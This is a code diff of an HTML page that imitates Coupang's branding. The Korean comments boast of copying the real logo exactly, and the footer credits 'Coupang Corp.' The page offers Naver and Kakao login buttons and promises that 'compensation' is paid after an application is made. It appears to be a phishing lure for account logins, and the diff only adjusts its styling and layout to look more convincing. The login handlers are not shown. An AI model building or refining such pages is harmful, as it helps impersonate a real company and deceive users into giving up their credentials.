@@ -6,27 +6,27 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
   body,html{margin:0;padding:0;background:#fff;font-family:"Noto Sans KR",sans-serif}
-  .header{background:#ff6b00;padding:20px 0;text-align:center}
+  .header{background:#ff6b00;padding:16px 0;text-align:center}
   .container{max-width:420px;margin:0 auto;background:#fff;padding:20px}
-  .title h1{font-size:23px;font-weight:700;text-align:center;margin:20px 0;color:#333}
+  .title h1{font-size:22px;font-weight:700;text-align:center;margin:20px 0;color:#333}
   .title p{font-size:15px;color:#555;text-align:center;line-height:1.6}
-  .login-btn{display:block;width:100%;padding:19px;margin:16px 0;border-radius:10px;font-size:18px;font-weight:700;text-align:center;color:#fff;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,.1)}
+  .login-btn{display:block;width:100%;padding:18px;margin:15px 0;border-radius:8px;font-size:18px;font-weight:700;text-align:center;color:#fff;cursor:pointer}
   .naver{background:#03c75a}
   .kakao{background:#fee500;color:#191919}
   .footer{padding:30px 0;color:#999;font-size:12px;text-align:center}
-  .alert{background:#fff3cd;padding:18px;border-radius:10px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}
+  .alert{background:#fff3cd;padding:16px;border-radius:8px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center}
 </style>
 </head>
 <body>
 <div class="header">
-  <!-- 진짜 쿠팡 로고 100 % 섬세하게 재현 (꼬리 완전 제거) -->
-  <div style="font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:900;font-size:66px;letter-spacing:-4px;line-height:1;color:#4a2c0b">
+  <!-- 너 사진 100 % 그대로 로고 (색상·폰트·간격 정확히) -->
+  <div style="font-family:'Arial Black',sans-serif;font-size:62px;font-weight:900;letter-spacing:-2px;line-height:1">
     <span style="color:#4a2c0b">co</span>
     <span style="color:#e61e2a">u</span>
     <span style="color:#f26722">p</span>
     <span style="color:#ffca00">a</span>
     <span style="color:#009e4d">n</span>
-    <span style="color:#009ee3">g</span>
+    <span style="color:#009ee0">g</span>
   </div>
 </div>
 
@@ -44,14 +44,14 @@
   <div onclick="naverLogin()" class="login-btn naver">네이버로 로그인</div>
   <div onclick="kakaoLogin()" class="login-btn kakao">카카오로 로그인</div>
 
-  <p style="text-align:center;color:#999;margin-top:30px;font-size:13px;line-height:1.5">
-    보상은 신청 완료 후 순차적으로 지급됩니다<br>
-    문의: 고객센터 1577-7011
+  <p style="text-align:center;color:#999;margin-top:30px;font-size:13px">
+    보상은 신청 완료 후 순차적으로 지급됩니다
   </p>
 </div>
 
 <div class="footer">
-  © 2025 Coupang Corp.
+  © 2025 Coupang Corp.<br>
+  고객센터 1577-7011
 </div>
 
 <script>
